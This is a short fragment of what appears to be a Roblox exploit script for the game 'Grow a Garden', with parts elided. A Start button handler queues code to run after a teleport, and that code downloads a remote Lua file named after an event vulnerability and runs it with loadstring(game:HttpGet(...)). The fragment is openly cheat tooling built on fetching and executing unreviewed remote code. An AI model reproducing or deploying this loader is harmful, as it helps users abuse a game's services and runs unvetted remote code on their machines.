...
noteText.Text = "Note: This requires a server restart/rejoin and will take time to operate. Please be patient. You can AFK once you clicked the Start Button. It will display the Black Hub and then go to Misc Section."
...
startButton.MouseButton1Click:Connect(function()
    queue_on_teleport([[
        ...
        loadstring(game:HttpGet("https://raw.githubusercontent.com/jzeerobloxscripts/grow-a-garden/refs/heads/main/qwerty/zeneventvuln.lua"))()
    ]])
    wait(8)
